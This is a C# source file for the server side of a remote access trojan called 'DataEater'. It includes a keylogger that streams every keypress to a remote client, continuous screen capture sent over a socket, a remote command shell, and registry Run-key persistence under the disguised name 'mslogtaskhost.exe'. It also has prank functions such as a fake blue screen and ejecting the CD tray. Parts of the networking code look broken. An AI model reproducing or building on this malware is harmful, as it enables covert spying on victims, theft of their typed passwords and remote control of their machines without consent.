using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Sockets; //abrir socket
using System.IO;
using System.Threading;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Drawing.Imaging;
using RemotingInterface;
using System.Runtime.Remoting;
using System.Runtime.Remoting.Channels;
using System.Runtime.Remoting.Channels.Tcp;
using RATServer;
using WindowsInput;
using Microsoft.Win32;
using System.Security.Principal;
using System.Runtime.Serialization.Formatters.Binary;
using System.Runtime.Serialization;

namespace RATServer
{
    public static class Connection
    {
        public static NetworkStream networkStream;
        public static StreamReader streamReader;
        public static StreamWriter streamWriter;
        public static TcpClient tcpClient;
        public static MemoryStream memoryStream;
        public static void ShutDownServer()
        {
            Connection.streamWriter.Close();
            Connection.streamReader.Close();
            Connection.networkStream.Close();
            if (Cmd.shellInitiated == true)
            {
                Cmd.processCmd.Close();
            }

        }
    }

    public static class ImageStream
    {
        public static NetworkStream networkStream;
        public static StreamReader streamReader;
        public static StreamWriter streamWriter;
        public static TcpClient tcpClient;
        public static MemoryStream memoryStream;

        public static void ShutDownServer()
        {
            ImageStream.streamWriter.Close();
            ImageStream.streamReader.Close();
            ImageStream.networkStream.Close();

        }

    }

    class Variables
    {
        public string strHelp = "Command Menu:\r\n" + "help This Help\r\n"
                                      + "message - Message\r\n" + "beep - Beep\r\n"
                                      + "shutDownSV - Shutdown the Server Process and Port\r\n"
                                      + "ejectCD - ejects CD tray\r\n" + "closeCD - closes CD tray\r\n"
                                      + "playSound - plays windows chime sound\r\n" + "changeVolume - change server volume\r\n"
                                      + "shell - opens command prompt shell \r\n";
    }

    class Threads
    {
        public Thread th_message, th_beep, th_blueScreen, th_closeCD, th_ejectCD, th_playSound, th_changeVolume, th_keylogging;
        public Thread th_notifyicon, th_remoteDesktop;
    }


    public class Remoting
    {
        public Bitmap memoryImage;
        public Image image;
        public byte[] buffer;


        public void SendImage()
        {
            for(;;)
            {
            CaptureDesktop();
            SaveDesktop();
            buffer = ReadImageFile("desktop.JPG");
            Connection.streamWriter.WriteLine("(Image) " + "[" + buffer.Length + "]");
            Connection.streamWriter.Flush();
            int count = 0;
            byte byteToSend;
            while(count <= buffer.Length)
                {
                    byteToSend = buffer[count];
                    Connection.networkStream.Write(byteToSend, 0, byteToSend);

                    count++;
                }
           
            System.Threading.Thread.Sleep(500);
            }
        }

        private static byte[] ReadImageFile(String img)
        {
            FileInfo fileinfo = new FileInfo(img);
            byte[] buf = new byte[fileinfo.Length];
            FileStream fs = new FileStream(img, FileMode.Open, FileAccess.Read);
            fs.Read(buf, 0, buf.Length);
            fs.Close();
            //fileInfo.Delete ();
            GC.ReRegisterForFinalize(fileinfo);
            GC.ReRegisterForFinalize(fs);
            return buf;
        }

        public void CaptureDesktop()
        {
            try
            {
                Rectangle rc = Screen.PrimaryScreen.Bounds;
                memoryImage = new Bitmap(rc.Width, rc.Height, PixelFormat.Format32bppArgb);
                using (Graphics memoryGraphics = Graphics.FromImage(memoryImage))
                {
                    memoryGraphics.CopyFromScreen(rc.X, rc.Y, 0, 0, rc.Size, CopyPixelOperation.SourceCopy);
                }
            }
            catch (Exception err) { }
        }

        public void SaveDesktop()
        {
            String pathName = String.Format("{0}\\", Path.GetDirectoryName(Application.ExecutablePath));
            string fileName = String.Format("{0}desktop.JPG", pathName);
            try
            {
                memoryImage.Save(fileName, ImageFormat.Jpeg);
            }
            catch (Exception err) { }
        }

    }


    public class Volume
    {

    }

    class Cmd
    {
        public static bool shellInitiated;

        public static Process processCmd = new Process();

        public static StringBuilder strInput;

        public static void CmdOutputDataHandler(object SendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    Connection.streamWriter.WriteLine(strOutput);
                    Connection.streamWriter.Flush();
                }
                catch (Exception err) { }
                {

                }
            }
        }


    }
    class InterceptKeys
    {
        public string pressedKey;

        [DllImport("User32.dll")]
        public static extern short GetAsyncKeyState(System.Windows.Forms.Keys vKey);

        [DllImport("User32.dll")]
        public static extern short GetAsyncKeyState(System.Int32 vKey);

        public StringBuilder keyBuffer = new StringBuilder();
        public void Keylog()
        {   
            string key = "";
            for (;;)
            {
                try
                {
                    foreach (System.Int32 i in Enum.GetValues(typeof(Keys))) //Iterate through each key to know whether it was pressed or not
                    {
                        if (InterceptKeys.GetAsyncKeyState(i) == -32767)   //-32767(minimum value) indicates that key was pressed since we last called this function
                        {
                            keyBuffer.Append("(keylog)");
                            keyBuffer.Append("[" + Enum.GetName(typeof(Keys), i) + "]");
                            key = keyBuffer.ToString();
                            Connection.streamWriter.Write(key + " \r\n");
                            Connection.streamWriter.Flush();
                            keyBuffer.Clear();
                            key = "";
                        }
                    }

                    System.Threading.Thread.Sleep(10);
                }

                catch (Exception err) { Connection.ShutDownServer(); };
            }
        }
    }

    class Interaction {

        public void EnterText(string text)
        {
            InputSimulator.SimulateTextEntry(text);
        }

        public void BlueScreen(string time)
        {
            int timeInt = Int32.Parse(time);
            timeInt = timeInt * 1000;
            FakeDesktopForm fake_Desktop = new FakeDesktopForm();
            fake_Desktop.TopMost = true;
            fake_Desktop.Show();
            fake_Desktop.Refresh();
            Thread.Sleep(timeInt);

        }


        public void MessageCommand(string message)
        {
            TopMostMessageBox.Show(message, "DataEater\u2122 says:");
        }
    }

    
        class StartUpManager
   {  public void Execute()
            {

        
            if (IsUserAdministrator() == true)
            {
                try {
                AddAllUserStartup();
                Connection.streamWriter.Write("**DataEater\u2122 added to all user startup**** \r\n"); Connection.streamWriter.Flush();
                }
                catch
                {
                Connection.streamWriter.Write("**Adding to all user startup failed\u2122*** \r\n"); Connection.streamWriter.Flush();

                }
                        
            }
                    
            else
            {
                try
                {
                    AddCurrentUserStartup();
                    Connection.streamWriter.Write("**DataEater\u2122 added to current user startup** \r\n"); Connection.streamWriter.Flush();
                }
                catch
                {
                    Connection.streamWriter.Write("**Adding to current user startup failed** \r\n"); Connection.streamWriter.Flush();

                }
                        
            }
             }
            public  void AddCurrentUserStartup()
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                {
                    key.SetValue("mslogtaskhost.exe", "\"" + System.Reflection.Assembly.GetExecutingAssembly().Location + "\"");
                }
            }

            public  void AddAllUserStartup()
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                {
                    key.SetValue("mslogtaskhost.exe", "\"" + System.Reflection.Assembly.GetExecutingAssembly().Location + "\"");
                }
            }

           public  void RemoveApplicationFromCurrentUserStartup()
           {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                key.DeleteValue("mslogtaskhost", false);
            }
           }

            public  void RemoveApplicationFromAllUserStartup()
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                {
                    key.DeleteValue("mslogtaskhost", false);
                }
            }

            public  bool IsUserAdministrator()
            {
                //bool value to hold our return value
                bool isAdmin;
                try
                {
                    //get the currently logged in user
                    WindowsIdentity user = WindowsIdentity.GetCurrent();
                    WindowsPrincipal principal = new WindowsPrincipal(user);
                    isAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator);
                }
                catch (UnauthorizedAccessException ex)
                {
                    isAdmin = false;
                }
                catch (Exception ex)
                {
                    isAdmin = false;
                }
                return isAdmin;
            }
        }
   
    class CD
    {
        [DllImport("winmm.dll", EntryPoint = "mciSendStringA")]
        public static extern void mciSendStringA(string lpstrCommand, string lpstrReturnString, Int32 uReturnLength, Int32 hwndCallback);
        string rt = "";

        public void EjectCD()
        {
            mciSendStringA("set CDAudio door open", rt, 127, 0);
        }
        public void CloseCD()
        {
            mciSendStringA("set CDAudio door closed", rt, 127, 0);

        }
    }
    class Sound
    {
        [DllImport("winmm.dll")]
        public static extern int waveOutSetVolume(IntPtr hwo, uint dwVolume);


        public void BeepCommand(string time, string frequency)
        {
            int frequencyInt = Int32.Parse(frequency);
            int timeInt = Int32.Parse(time);
            timeInt = timeInt * 1000;
            Console.Beep(frequencyInt, timeInt);
        }

        public void PlaySoundCommand()
        {
            System.Media.SoundPlayer soundPlayer = new System.Media.SoundPlayer();
            soundPlayer.SoundLocation = @"C:\Windows\Media\chimes.wav";
            soundPlayer.Play();
        }

        public void ChangeVolume(uint levelu)
        {

            if (levelu == 0)
            {
                waveOutSetVolume(IntPtr.Zero, 0);
            }
            else {
                uint NewVol = uint.MaxValue / levelu; waveOutSetVolume(IntPtr.Zero, NewVol);
            }
        }
    }
}


